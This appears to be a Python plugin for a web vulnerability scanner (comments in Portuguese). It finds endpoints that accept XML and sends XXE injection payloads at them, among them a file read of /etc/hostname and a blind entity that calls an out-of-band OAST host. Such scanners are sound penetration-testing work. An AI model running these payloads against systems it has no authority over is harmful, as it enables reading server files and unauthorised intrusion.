#!/usr/bin/env python3
"""
XXE Hints — XML External Entity Injection detection.
Detecta endpoints que aceitam XML e testa payloads XXE com OAST.
"""
import json
import time
import httpx
from pathlib import Path
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

from core.config import DEFAULT_USER_AGENT, REQUEST_DELAY, DEFAULT_TIMEOUT
from menu import C
from plugins import ensure_outdir
from ..output import info, success, warn, error
from ..http_utils import format_http_request, format_http_response

# Payloads XXE
def _build_payloads(oast_url: str | None = None):
    payloads = []

    # Classic XXE
    payloads.append({
        "name": "Classic XXE (file read)",
        "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
        "detect": lambda body: any(x in body.lower() for x in ["localhost", "hostname", "root"]),
    })

    # Parameter entity (blind)
    if oast_url:
        payloads.append({
            "name": "Blind XXE via OAST",
            "body": f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{oast_url}/xxe">%xxe;]><foo>test</foo>',
            "detect": lambda body: False,  # Blind — detectado via OAST
        })

    # Error-based XXE
    payloads.append({
        "name": "Error-based XXE",
        "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent">]><foo>&xxe;</foo>',
        "detect": lambda body: any(x in body.lower() for x in ["no such file", "failed to open", "error", "exception"]),
    })

    return payloads


def _detect_xml_endpoint(url: str) -> bool:
    """Testa se o endpoint aceita Content-Type XML."""
    try:
        with httpx.Client(timeout=DEFAULT_TIMEOUT, verify=False) as client:
            # OPTIONS para verificar Accept
            resp = client.options(url, headers={"User-Agent": DEFAULT_USER_AGENT})
            accept = resp.headers.get("accept", "").lower()
            content_type = resp.headers.get("content-type", "").lower()
            if "xml" in accept or "xml" in content_type:
                return True

            # POST com XML mínimo para ver se aceita
            resp2 = client.post(url, content="<test/>", headers={
                "User-Agent": DEFAULT_USER_AGENT,
                "Content-Type": "application/xml",
            })
            # Se não retornar 415 (Unsupported Media Type), pode aceitar XML
            if resp2.status_code != 415:
                return True
    except Exception:
        pass
    return False


def _test_xxe(url: str, oast_url: str | None) -> list:
    """Testa payloads XXE em um endpoint."""
    findings = []
    payloads = _build_payloads(oast_url)

    for payload_cfg in payloads:
        time.sleep(REQUEST_DELAY)
        try:
            with httpx.Client(timeout=DEFAULT_TIMEOUT, verify=False, follow_redirects=True) as client:
                resp = client.post(url, content=payload_cfg["body"], headers={
                    "User-Agent": DEFAULT_USER_AGENT,
                    "Content-Type": "application/xml",
                })

                detected = payload_cfg["detect"](resp.text)

                if detected or resp.status_code == 200:
                    risk = "CRITICAL" if detected else "LOW"
                    details = f"XXE payload aceito ({payload_cfg['name']})"
                    if detected:
                        details += " — resposta indica processamento de entidade externa!"

                    findings.append({
                        "url": url,
                        "payload_name": payload_cfg["name"],
                        "status": resp.status_code,
                        "risk": risk,
                        "type": "XXE",
                        "detected": detected,
                        "details": details,
                        "request_raw": format_http_request(resp.request),
                        "response_raw": format_http_response(resp),
                    })

                    if detected:
                        break  # Já confirmado, não precisa testar mais
        except Exception:
            pass

    return findings


def run(context: dict):
    target = context.get("target")
    if not target:
        raise ValueError("Target required")

    info(
        f"\n🟪───────────────────────────────────────────────────────────🟪\n"
        f"   📄 {C.BOLD}{C.CYAN}XXE (XML External Entity) SCANNER{C.END}\n"
        f"   🎯 Alvo: {C.GREEN}{target}{C.END}\n"
        f"🟪───────────────────────────────────────────────────────────🟪\n"
    )

    outdir = ensure_outdir(target, "xxe")

    # Ler OAST payload se disponível
    oast_file = Path("output") / target / "oast_payload.txt"
    oast_url = None
    if oast_file.exists():
        oast_url = oast_file.read_text().strip()
        if oast_url:
            info(f"   🔗 OAST disponível: {C.YELLOW}{oast_url}{C.END}")

    # Ler URLs
    urls_file = Path("output") / target / "urls" / "urls_200.txt"
    endpoint_file = Path("output") / target / "endpoint" / "endpoints.txt"

    all_urls = set()
    for f in [urls_file, endpoint_file]:
        if f.exists():
            all_urls.update(l.strip() for l in f.read_text(errors="ignore").splitlines() if l.strip())

    if not all_urls:
        warn("⚠️ Nenhuma URL encontrada.")
        (outdir / "xxe_results.json").write_text(json.dumps([], indent=2))
        (outdir / "scan_summary.json").write_text(json.dumps({"tests_run": 0, "endpoints_checked": 0, "findings": 0, "status": "NO_INPUT"}, indent=2))
        return []

    # Filtrar endpoints que parecem aceitar XML (por path heuristic)
    xml_hints = ["api", "xml", "soap", "wsdl", "feed", "rss", "import", "upload", "parse", "webhook"]
    candidates = []
    for url in all_urls:
        path = urlparse(url).path.lower()
        if any(h in path for h in xml_hints):
            candidates.append(url)

    # Também testar endpoints base
    for scheme in ["https", "http"]:
        candidates.append(f"{scheme}://{target}/api")
        candidates.append(f"{scheme}://{target}")

    candidates = list(set(candidates))[:50]  # Limitar
    info(f"   📋 {len(candidates)} endpoints candidatos para teste XXE")

    results = []
    tests_run = 0

    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(_test_xxe, url, oast_url): url for url in candidates}

        for future in as_completed(futures):
            tests_run += 1
            try:
                findings = future.result()
                if findings:
                    results.extend(findings)
                    for f in findings:
                        color = C.RED if f["risk"] == "CRITICAL" else C.YELLOW
                        info(f"   {color}[{f['risk']}]{C.END} {f['url']} — {f['payload_name']}")
            except Exception:
                pass

    output_file = outdir / "xxe_results.json"
    output_file.write_text(json.dumps(results, indent=2, ensure_ascii=False))

    confirmed = [r for r in results if r.get("detected")]
    summary = {"tests_run": tests_run, "endpoints_checked": len(candidates), "findings": len(results), "confirmed": len(confirmed), "status": "COMPLETED"}
    (outdir / "scan_summary.json").write_text(json.dumps(summary, indent=2))

    if confirmed:
        success(f"\n   📄 🔴 {len(confirmed)} XXE CONFIRMADO(s)!")
    elif results:
        info(f"   ⚠️ {len(results)} endpoints aceitam XML (potencial XXE) mas sem confirmação direta.")
    else:
        info(f"   ✅ 0 XXE. Testados {len(candidates)} endpoints.")

    success(f"   📂 Salvos em {output_file}")
    return results
